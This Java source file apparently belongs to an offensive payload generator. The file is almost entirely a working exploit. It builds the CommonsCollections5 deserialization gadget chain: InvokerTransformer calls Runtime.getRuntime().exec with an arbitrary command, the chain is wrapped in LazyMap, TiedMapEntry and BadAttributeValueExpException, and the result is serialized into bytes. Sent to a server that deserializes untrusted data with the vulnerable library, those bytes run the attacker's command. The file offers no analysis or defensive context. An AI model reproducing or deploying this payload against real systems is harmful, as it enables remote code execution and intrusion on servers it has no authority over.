package cn.safe6.payload.shortPayload.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 extends Payload {
    @SuppressWarnings("all")
    public static byte[] getPayloadUseCommand(String cmd) {
        try {
            final Transformer transformerChain = new ChainedTransformer(
                    new Transformer[]{new ConstantTransformer(1)});
            final Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{
                            "getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{
                            null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class}, new Object[]{cmd}),
                    new ConstantTransformer(1)};
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            Field valfield = val.getClass().getDeclaredField("val");
            valfield.setAccessible(true);
            valfield.set(val, entry);
            setFieldValue(transformerChain, "iTransformers", transformers);
            return serialize(val);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new byte[]{};
    }
}
